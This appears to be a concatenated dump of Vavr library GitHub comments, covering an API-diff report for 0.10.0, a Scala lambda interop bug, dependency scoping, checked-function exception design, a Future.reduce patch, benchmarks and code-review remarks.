io.vavr.concurrent.Future\n[INFO]          - method ofCallable(java.util.concurrent.ExecutorService,java.util.concurrent.Callable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method ofSupplier(java.util.concurrent.Executor,java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method ofSupplier(java.util.concurrent.ExecutorService,java.util.function.Supplier)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method reduce(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.BiFunction)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method reduce(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.BiFunction)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method run(io.vavr.concurrent.Task)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method run(java.util.concurrent.Executor,io.vavr.CheckedRunnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method run(java.util.concurrent.Executor,io.vavr.concurrent.Task)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method run(java.util.concurrent.ExecutorService,io.vavr.CheckedRunnable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method runRunnable(java.util.concurrent.Executor,java.lang.Runnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method runRunnable(java.util.concurrent.ExecutorService,java.lang.Runnable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method sequence(java.util.concurrent.Executor,java.lang.Iterable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method sequence(java.util.concurrent.ExecutorService,java.lang.Iterable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method successful(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method successful(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method traverse(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.Function)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]      > interface io.vavr.concurrent.Promise\n[INFO]          + method executor()\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method failed(java.util.concurrent.Executor,java.lang.Throwable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method failed(java.util.concurrent.ExecutorService,java.lang.Throwable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method fromTry(java.util.concurrent.Executor,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method fromTry(java.util.concurrent.ExecutorService,io.vavr.control.Try)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method make(java.util.concurrent.Executor)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method make(java.util.concurrent.ExecutorService)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method successful(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method successful(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]      + interface io.vavr.concurrent.Task\n[INFO]          + access abstract\n[INFO]          + method run(io.vavr.concurrent.Task$Complete)\n[INFO]              + access abstract\n[INFO]              + return void\n[INFO]          + annotated java.lang.FunctionalInterface\n[INFO]      + interface io.vavr.concurrent.Task$Complete\n[INFO]          + access abstract\n[INFO]          + access static\n[INFO]          + method with(io.vavr.control.Try)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + annotated java.lang.FunctionalInterface\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] < io.vavr.control                                    minor      0.10.0     0.9.3      0.10.0     -         \n[INFO]      < interface io.vavr.control.Either\n[INFO]          + method filterOrElse(java.util.function.Predicate,java.util.function.Function)\n[INFO]              + return io.vavr.control.Either\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toValidation()\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Either\n[INFO]          + method traverseRight(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Either\n[INFO]      + interface io.vavr.control.HashCodes\n[INFO]          + access abstract\n[INFO]          + method hash(boolean)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(boolean,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(byte)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(byte,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(char)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(char,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(double)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(double,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(float)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(float,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(int)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(int,int)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(long)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(long,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(short)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(short,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]      < interface io.vavr.control.Option\n[INFO]          + method fold(java.util.function.Supplier,java.util.function.Function)\n[INFO]              + return java.lang.Object\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Option\n[INFO]      < interface io.vavr.control.Try\n[INFO]          + method fold(java.util.function.Function,java.util.function.Function)\n[INFO]              + return java.lang.Object\n[INFO]          + method onFailure(java.lang.Class,java.util.function.Consumer)\n[INFO]              + annotated io.vavr.control.GwtIncompatible\n[INFO]              + return io.vavr.control.Try\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toValidation()\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method toValidation(java.util.function.Function)\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Try\n[INFO]      < interface io.vavr.control.Validation\n[INFO]          + method fromTry(io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Validation\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n```\n\n\n. Thank you for the kind words @PHaroZ !. Duplicate of #2338. Hi,\nthank you for reporting the issue!\nLambda is a package-private class, which will disappear in vavr-1.0.\nI'm about to release vavr-0.10.0, so I will fix that.\nDoes the error also occur with Scala 2.13.0-M5?\nThanks!. Thank you for your feedback, that helps!\nBtw - I did not know about coursier, that is really an awesome way of setting the classpath!\nI could reproduce the problem but I needed to tweak your scripts a bit:\ndiff\n- scalac -d out -classpath (coursier fetch io.vavr:vavr:0.9.3 | paste -s -d:) Main.scala\n+ scalac -d out -classpath \"$(coursier fetch -p io.vavr:vavr:0.9.3)\" Main.scala\n- scala -d out -classpath out:(coursier fetch io.vavr:vavr:0.9.3 | paste -s -d:) Main\n+ scala -d out -classpath out:\"$(coursier fetch -p io.vavr:vavr:0.9.3)\" Main\nI will give you an update the next days.... Aha! :). Ok, it runs now on my local machine, using a local build of vavr-0.10.0-SNAPSHOT.\n\nI will re-test it with the final build before release.. Update: Sorry, I used the wrong example. It does still not work.\nscala\nobject Main {\n  def main(args: Array[String]): Unit = {\n    // does work :)\n    val f: java.util.function.Function[Int, Int] = i => i\n    // does not work :/\n    val f2: io.vavr.Function1[Int, Int] = i => i\n  }\n}\nError:\nCaused by: java.lang.invoke.LambdaConversionException: Type mismatch for instantiated parameter 0: class java.lang.Object is not a subtype of interface java.util.function.Function\n        at java.base/java.lang.invoke.AbstractValidatingLambdaMetafactory.checkDescriptor(AbstractValidatingLambdaMetafactory.java:308)\n        at java.base/java.lang.invoke.AbstractValidatingLambdaMetafactory.validateMetafactoryArgs(AbstractValidatingLambdaMetafactory.java:296)\n        at java.base/java.lang.invoke.LambdaMetafactory.altMetafactory(LambdaMetafactory.java:503)\n        at java.base/java.lang.invoke.BootstrapMethodInvoker.invoke(BootstrapMethodInvoker.java:138)\nMaybe this error occurs, because Vavr's Function1 extends j.u.f.Function and scala is confused about that. \ud83e\udd14\n\nThe current SNAPSHOT can be tested here:\n```bash\n!/bin/bash\nDEPS=coursier fetch -r https://oss.sonatype.org/content/repositories/snapshots/ -p io.vavr:vavr:0.10.0-SNAPSHOT\nscalac -d out -classpath $DEPS Main.scala\nscala -classpath out:$DEPS Main\n```\n. As you said, it could be that Scala introduced a bug in recent versions regarding creation/handling of Lambda MetaFactories, MethodHandles.Lookup etc - it worked before...\nIt would be interesting to reproduce it with a minimal non-Vavr functional interface.. I do some further tests.\nTestee\nI use the following testee, because it failed to compile with Vavr (see above).\nscala\nobject Main {\n  def main(args: Array[String]): Unit = {\n    val f: test.FI[Int, Int] = i => i\n  }\n}\nI compile the test the following way (using JDK8 and JDK11):\nbash\njavac -cp . ./test/FI.java\nscalac -d out -classpath . Main.scala\nscala -classpath out:. Main\n\u2705 Extending a functional interface\nA custom Java functional interface (fi) that extends a Java standard lib fi works fine with Scala:\n```java\n// file FI.java\npackage test;\n@FunctionalInterface\npublic interface FI extends java.util.function.Function {\n    @Override\n    R apply(T t);\n}\n```\n\u2705 Internally using an auxiliary interface\n```java\n// file FI.java\npackage test;\n@FunctionalInterface\npublic interface FI {\nstatic <T, R> FI<T, R> of(FI<T, R> f) {\n    return (FI<T, R> & Internal) f;\n}\n\nR apply(T t);\n\n}\ninterface Internal {\n}\n```\n\u2705 Internally using package private interface\n```java\n// file FI.java\npackage test;\n@FunctionalInterface\npublic interface FI {\nstatic <T, R> FI<T, R> of(FI<T, R> f) {\n    return (FI<T, R> & Pkgprivate) f;\n}\n\nR apply(T t);\n\n}\n```\n```java\n// file Pkgprivate.java\npackage test;\ninterface Pkgprivate {\n}\n```\n\u2705 Serializable functional interface\n```java\n// file FI.java\npackage test;\n@FunctionalInterface\npublic interface FI extends java.io.Serializable {\nlong serialVersionUID = 1L;\n\nR apply(T t);\n\n}\n```\n. @2m I found a minimal Java-only example and filed a Scala bug: scala/bug#11373\nThx!. Thanks for the hint, will do!\nDo you have  (a minimal) Gradle config that I can take as example?. @Sir4ur0n thank you, that helps! I think there also needs to be the additional dependency\ngroovy\ncompileOnly(\"io.vavr\", \"vavr-match\", vavrVersion). I see. That is interesting because vavr-match should only be a compile time dependency of Vavr. I think the dependency 'leaked' into the library with the PR #2294.\nI need to fix that in the next version.\n\n. Sorry, I confused Maven\u2019s compile with Gradle\u2019s compileOnly.\nWhat I meant was that we might need s.th. like Maven\u2019s provided in order not to leak vavr-match as transitive dependency.\nSee \nhttps://blog.gradle.org/introducing-compile-only-dependencies\nThe important parts:\n\n\n. Yes, that would make sense!. Thank you for the hint!\nI will address the documentation in the upcoming 0.10.0 minor release.\nMmhh \ud83e\udd14 Scala does not have an immutable LinkedHashMap. Maybe for exactly that reason. Here are Scala's performance characteristics.\nI will check what we can do on the implementation side, targeting 1.0.0.. Thank you, I forgot about that! Rarely used it. The name ListMap suggests linear complexity (because of List).\nI plan to align more tightly to Scala that we did before, including naming and API. There are a few exceptions like Scala:foreach vs Java:forEach because we inherit it etc.\n. I will lay out the design of Vavr 1.0 collections in detail (here on the issue tracker).\nIt will be open for discussion. Your view always helps a lot!. @yuriykulikov Vector is effectively O(1), because of the high branching factor of the underlying tree structure. A List fits good for few elements, Vector scales better when the number of elements gets bigger.\nCurrently LinkedHashMap internally maintains two data structures, one for the Map (currently HAMT based, in a future impl maybe CHAMP based, like in the upcoming Scala 2.13), and one for the order of elements. I think there is room for improvement, maybe a dedicated/optimized low-level data structure.. @nfekete it still applies but the v0.9.3 unit tests fail if I run them with the v0.10.0 version. I would break applications.\nIn v0.10.0 CheckedFunctions will behave like in v0.9.3. We will ship that feature/change in v1.0.0.\nNote: I saved all changes that do not make it into v0.10.0 to the branch stash-pre-0.10.0. I will diff it in order to be aware of changes that still need to be shipped.. I think here is a bit of confusion.\n\nI think you talk about best practices regarding the producer site. \"One should not throw Throwable\", which is perfectly ok.\nI talk about the consumer site. I need to handle Throwable because it is possible.\n\nChecked{Predicate,Supplier,Runnable,...} are part of the API definition of Try. It is the consumer site. It needs to handle Throwable, otherwise we would have a hole / a partially defined API. The library needs to support what is possible in Java, otherwise it would be incomplete and therefore a bad experience. We would leave the user in a stuck situation, he would need to implement workarounds, like wrapping exceptions. The only purpose of Try is to solve that wrapping problem.\n\nYou wish programs (by convention) that are located on the right side. But without wrapping because everyone only throws Exception or Error (which behaves like a runtime exception). That is Utopia.\nThe Try API needs functional interfaces that handle the Throwable case.\n\nWlog, io.vavr.(Checked)Function* is used out of the context of Try. Here I can understand that it is better to throw Exception instead of Throwable.\njava\nvoid f(CheckedFunction1<T,  R> in) {\n    try {\n        in.apply(...);\n    } catch(Exception x) {\n        handle(x);\n    } catch(Error x) {\n        throw x;\n    } catch(Throwable x) {\n        // don't know what to do here because it should never happen\n    }\n}\n. @tlinkowski I had a use-case in mind that your examples do not cover.\n```java\nclass TertiumDatur extends Throwable {{\n    assert !((Throwable) this instanceof Error);\n    assert !((Throwable) this instanceof Exception);\n}}\ninterface CheckedFunction0 {\n    R apply() throws Exception;\n}\nclass Try {\n    static  Try of(CheckedFunction0<? extends T> supplier) {\n        return null;\n    }\n}\nclass TryTest {\n    void shouldCreateTry() {\n        // \u274c COMPILER ERROR: Unhandled exception: TertiumDatur\n        Try.of(() -> { throw new TertiumDatur(); });\n    }\n}\n```\nI provide a library for Java. So I have to cover all use-cases.\n\nYour main argument is that there exist only Exception and Error as subclasses of Throwable. I provided the counter example.\nWhat you really mean is, that it is good practice to only use one of Exception and Error. But the reality looks different.\n\nAgain, I think about library design (consumer in the image above). You think about application code (producer in the image above). You write idiomatic code that does a common task in the common way for Java. I design a library that is able to handle all kind of code.\nMaybe it is easier to accept for you, if you see (wlog) the CheckedSupplier interface only as consumer part of the Try API. You do not need to use CheckedSupplier in your code. (Maybe I can clarify this in the Javadoc).\nInstead you are still able to write code that declares only throws Exception:\n```java\n// method example\nObject f2() throws Exception {\n    throw new Error();\n}\nvoid test() {\n    // lambda example where CheckedFunction0 throws Exception\n    CheckedFunction0<?> f1 = () -> { throw new Error(); };\n    Try<?> try1 = Try.of(f1::apply); // \u2705 compiles fine\n    Try<?> try2 = Try.of(this::f2); // \u2705 compiles fine\n}\n```\nEffectively, it makes absolutely no difference, wether you throw Throwable or Exception. Who cares? Try catches them all. That is what unchecked exceptions are all about!\njava\n// lambda example where CheckedSupplier throws Throwable\nCheckedSupplier<?> f3 = () -> { throw new Throwable(); };\nTry<?> try3 = Try.of(f3); // \u2705 compiles fine\n\nI don't want to blame someone here, ...but... the relatively popular Calypso Trading System for example extends Throwable with their own type of exceptions.\nThere is real-world Java software out there that does stupid things.\nWhy?\nBecause Java is designed that way and gives the users the ability to do so.\nThat's bad. In a (more) perfect world, Java would have type aliases and union types (or unchecked exceptions):\njava\ntype Throwable = Exception | Error;\n\u00af\\_(\u30c4)_/\u00af\n. From the library design perspective it is questionable to let CheckedFunctionN throw Exception instead of Throwable.\nWhen Java will get primitive generics, I want to migrate the following:\n```java\nio.vavr.control.CheckedFunction -> io.vavr.CheckedFunction1\nio.vavr.control.CheckedSupplier -> io.vavr.CheckedFunction1\nio.vavr.control.CheckedConsumer -> io.vavr.CheckedFunction1\nio.vavr.control.CheckedPredicate -> io.vavr.CheckedFunction1\nio.vavr.control.CheckedRunnable -> io.vavr.CheckedFunction1\n// io.vavr.CheckedFunction0 will not be needed anymore\n```\nThis will only work, if io.vavr.CheckedFunctionN throw Throwable.\nHOWEVER, this will not go into Vavr 2.0. We need to stay backward compatible to Java 8 for now, so we can have CheckedFunctionN that throw Exception.. @nfekete thank you. We still change io.vavr.CheckedFunction0..8 the way that they throw Exception. D\u2019accord?. Yes, that is right. It is not possible to declare singleton functional interfaces in Java that cover all use-cases. I need to distinguish between public (Checked)Function* API and those fi\u2019s required by the Try API.. @tlinkowski thank you for asking, your questions are important!\nTry should only rethrow fatal exceptions that put the JVM in a non-recoverable state.\nIt is intended that the user should have the ability to also handle errors. One obvious use-case that comes to my mind is multi-threading. Our io.vavr.concurrent.Future wraps the result of an async computation in a Try. If an Error would escape another Thread, the 'current' thread would never see it. The only way would be to utilize an UncauchtExceptionHandler (which might be necessary though for corner cases). But it is part of our programming model to use Try to catch all non-fatal exceptions.\n\nYes, @nfekete is right - it is an invariant / part of the definition of the type Failure that it only wraps exceptions considered as non-fatal. Generally the constructor should only set the instance fields in Vavr but here I made an exception in order to enforce it.\nIf we get real sealed types in Java, this implementation might change. E.g. a data class might have the following syntax:\n```java\nsealed interface Try {\n    // factory methods have some logic\n}\ndata class Success(T success) implements Try {}\ndata class Failure(Throwable cause) implements Try {}\n```\nWe will see. (However, I think even with data classes we have to be able to 'intercept' object construction somehow.). Hi @CauchyPeano, I think it was my fault. Yes, the compilescope is default in Maven. I've confused it with Gradle's compileOnly scope. See my comment on #2339.\nWhat I really need is that the compile time annotations (included in vavr-match) are only loaded when compiling the vavr library. The exist no other use-cases than that.\nWhat's the right way for a library to express this in Maven?\n\n[ ] optional\n[ ] provided\n\nBoth seem to have similar semantics. However, some tools like the assembly plugin or the shade plugin do not seem to honor the scope correctly ... I don't know.\nMaybe it isn't that important. Vavr 1.0 will not use the annotations internally anymore.\nWe should just leave Vavr 0.10.0 as-is in order to stay backward compatible.\nTherefore I will close this issue. Sorry for the confusion!!. Thank you, that was a fast 'fix' :)\nAs I stated in #2364, it is better to stay backward compatible.\nSorry for all the confusion \ud83d\ude48. Thx!. Looks like the optimized version is the fastest. Having an AbstractIterator (like Scala does, in order to reduce class file size of implementing classes) is contra-productive.\nBenchmark                                                                                                  Mode  Cnt   Score   Error  Units\nArrayIteratorBenchmark.fullyIteratingArrayIteratorNaiveFor1000Elements                                     avgt   25  20.630 \u00b1 0.063  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorNaiveForOneElement                                       avgt   25   3.429 \u00b1 0.009  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchFor1000Elements                                  avgt   25  20.829 \u00b1 2.839  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchForOneElement                                    avgt   25   3.431 \u00b1 0.011  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchOptimizeExtendsAbstractIteratordFor1000Elements  avgt   25  21.244 \u00b1 3.434  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchOptimizedExtendsAbstractIteratorForOneElement    avgt   25   3.436 \u00b1 0.016  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchOptimizedFor1000Elements                         avgt   25  18.974 \u00b1 0.033  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorTryCatchOptimizedForOneElement                           avgt   25   3.434 \u00b1 0.007  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorWithLengthFor1000Elements                                avgt   25  20.662 \u00b1 0.046  ns/op\nArrayIteratorBenchmark.fullyIteratingArrayIteratorWithLengthForOneElement                                  avgt   25   3.434 \u00b1 0.011  ns/op\n. Note: coverage temporarily decreased because I created JUnit 5 test interfaces that will used as mixins for 'real' test classes. Well spotted, thank you! We will need to patch Future#reduce like that:\ndiff\nstatic <T> Future<T> reduce(Executor executor, Iterable<? extends Future<? extends T>> futures, BiFunction<? super T, ? super T, ? extends T> f) {\n    Objects.requireNonNull(executor, \"executor is null\");\n    Objects.requireNonNull(futures, \"futures is null\");\n    Objects.requireNonNull(f, \"f is null\");\n    if (!futures.iterator().hasNext()) {\n        throw new NoSuchElementException(\"Future.reduce on empty futures\");\n    } else {\n-       return Future.<T> sequence(futures).map(seq -> seq.reduceLeft(f));\n+       return Future.<T> sequence(executor, futures).map(seq -> seq.reduceLeft(f));\n    }\n}\n. Please use map / mapTry instead of onSuccess.. Thank you for asking!. Hi @castillobgr,\nthank you for using Vavr! And thank you for your suggestion.\nOn my journey developing Vavr 1.0 I'm focusing on reducing the API surface are. We achieve this by putting a strong focus on the Scala 2.13 API. Native Scala does not have FutureEither.\nI think there are a lot of interesting topics that fit not well into the core library but could be defined on their own, in a separate library. Namely, lifting monads, monad transformers, ... all the abstractions that can be found in Scalaz, Cats, etc.\nIt is a strategic decision not to add these to the Vavr core library.\nBeside that, I asked myself how do you plan to transform runtime errors to Left values? For example\njava\n// HTTP.GET returns Either<Integer, T>, where the Integer is the HTTP return code in the error case\nFutureEither.of(() -> HTTP.GET(\"/resource\"));\nIn the example above, HTTP.GET could throw a TimeoutException or SocketException for example.\nCan FutureEither deal with it?\n\nGiven that we add For(Either...), the solution using the existing For methods instead of the flatMap/map cascade  would look like this:\njava\nvar fe1 = Future.successful(Either.right(\"hello \"));\nvar fe2 = Future.successful(Either.right(\"world!\"));\nvar result = For(fe1, fe2).yield((e1, e2) ->\n        For(e1, e2).yield((s1, s2) -> s1 + s2)\n);\nBut currently we only support Iterable, Future, List, Option and Try. We will add Either!\n\nImplementing a new type FutureEither<...> is costly. I think what you really want is syntactic sugar for transforming the state of Future<Either<<...>>.\nIt could be achieved like this:\n```java\n// API\n Function, Future>> ForT(Future> fe1, Future> fe2) {\n    return f -> For(fe1, fe2).yield((e1, e2) -> For(e1, e2).yield(f));\n}\n// call site\nvar result = ForT(fe1, fe2).apply((s1, s2) -> s1 + s2);\n```\nNotes:\n\ncurrently Vavr is missing For(Either...), it will be added and Either will be treated as right-biased\nabove I spoilered the upcoming Vavr 1.0 syntax of For. It will return a function. The 'yield'  method will be an 'apply'  then.\nVavr has a generic API.For(Future<T>...). Adding an API.For(Future<Either<...>...) would lead to ambiguities.\n\nI do not plan to add ForT methods to the core library, it would be hard to argue against other syntactic sugar methods then. Instead it would make more sense to add an additional library on top of the core library, that adds syntactic sugar for more advanced use-cases...\nI hope you understand it. It is important to keep the library as small as possible. If the feature isn't part of native Scala, it will most probably not be included in Vavr. Long term, it is the basis for Vavr's health.. @castillobgr \n\nBtw, if you can point me in the right direction (docs, bugs, etc), I'd love to contribute and keep Vavr going strong!\n\nThank you! When the 1.0 API evolves there will be plenty of things to do :) However, I still need some time.... Hi & thank you for your proposal.\nWhat you do here is to work around the monadic nature of Try. Especially the shortcut circuit (reacting on the first failure) is the right semantics of sequence().\nWhat you really want is a form of error handling that accumulates errors. It could be something like\nSyntax\n```\nclass Try {\nstatic <T> Either<Seq<Throwable>, Seq<T>> accumulate(Try<T>... values);\n\nstatic <T> Either<Seq<Throwable>, Seq<T>> accumulate(Iterable<? extends Try<? extends T>> values);\n\n}\n```\n(Modulo naming, i.e. it might change. We also need to look at the Scala world. Someone most probably already has thought about it!)\nSemantics\n\nIn the error case all throwables are accumulated an Either Left<Seq<Throwable>> is returned\nOtherwise all successful values are accumulated an Either Right<Seq<T>> is returned\n. We don't need something like addSuppressed() in order to link a tree of Throwables (using the cause). A Seq / Iterable is already a tree (a flat one). Keep it simple. There are only two use cases: 1) sequencing multiple Try instances using the shortcut circuit, 2) sequencing multiple Try instances while accumulating errors.\n\nBefore starting to implement something self-invented, we should see what already exists in the Scala ecosystem, like typelevel Cats etc. Please create an issue in order to plan it. I will close this PR.\nThx!. I see. However, my intuition tells me that it is a bit odd that dependent operations (in the sense that one failure may be the cause of another) are separated in two Try instances that are sequenced. Instead I would assume that Try calls are (deeply) cascaded instead using flatMap or map (as you showed above).\nCould you give me a real-world use-case where two separate Try/Failure instances relate on each other by cause?. Yes, thanks! Will fix that.\n. In general you are of course right. Here, this check is unnecessary because the Iterator is internally used only. The Stream.ofAll(Iterator) uses a for-loop to iterate the elements. Please remove the check to save cycles.\n. This has to be a \\n, not a %n to create a new line.\n. Yes, right. Here we can use \"\\n\" + indent + value + children. Could you do that, please?\nIn general I prefer readability, because the String representations are mostly used for Debug purpose or probably in the future Java 9 REPL :-)\nWhen it comes to high performance issues, we will use StringBuilder. See also http://stackoverflow.com/a/13815477/1110815\n. here both solutions are ok! you can decide.\n. We should use java.util.function.Function instead of javaslang.Function1 here. Function1 is a Function, so we widen the type and increase the interoperability with Java a little bit.\n. We should choose similar names for the test methods. I like the shouldXxx notion because is a readable spec and testXxx is redundant with @Test.\n. In general, I would directly return the match result. No need to introduce a variable, it has the same name as the method.\n. Without having tried it, I think it should work to directly return knownPrimes.drop(index - 1).head();. If index == 1 we are dropping 0 and then Stream.gen seed of 2 is returned.\n. Match is good for recognizing objects of a specific type. I would suggest to use the good old if instead, also because Match uses deserialization of lambdas which costs cycles.\njava\nif (previousPrime == 2) {\n    return 3;\n} else {\n    return Stream.gen(previousPrime + 2, v -> v + 2)\n            .filter(i -> !isEvenlyDiversableByKnownPrimes(previousPrime, i))\n            .take(1).head();\n}\nor even\njava\nreturn (previousPrime == 2) ? 3 : Stream.gen(previousPrime + 2, v -> v + 2)\n            .filter(i -> !isEvenlyDiversableByKnownPrimes(previousPrime, i))\n            .take(1).head();\nThis should be much faster.\n. Instead of appending the previousPrime I would takeWhile with p <= previousPrime instead of p < previousPrime. This should give the same result.\n. I omit the braces (p) and write p when there is not type in a single lambda argument. Braces are a little redundant.\n. I also fought with javadoc / doclint. and discovered that we can use for paragraphs also a single <p> as a kind of separator. This javadoc is totally ok!! I just wanted to mention it because it surprised me that a single <p> is allowed. Feels a little bit like invalid html. However, I use it in newer javadocs, because it is shorter.\nThese are the same:\njava\nSome text.\n<p>\nMore text.\njava\n<p>Some text.</p>\n<p>More text.</p>\nAdditionally code blocks and lists do not need no paragraph separator.\n``` java\nSome text.\n\n\n// code\n\n\nMore text.\n\nitem\n\n``\n. This is great to hear. The whole Match API was an experiment. It is good to see that it makes sense.\n. Btw (offtopic) - the Match API will change slightly with #227. The currentorElsewill be namedotherwise`. And there will be an additional, more monadic API that returns a value instead of a function which has to be applied.\njava\nMatch.of(value)\n   .when(...)\n   .when(...)\n   .otherwise(...);\n. We apply the head that is already given, so we can apply it before the call of build. I will give an example in a comment below...\nThen we can rename build to gen and use Supplier<Stream<T>> instead of the Function.\n. java\n// maybe tuple is not a good name...\nfinal Tuple2<...> tuple = new Tuple2<>(nextPrimeFactor, previousFactorAndResultingVal._2 / nextPrimeFactor);\nreturn Stream.gen(tuple, () -> 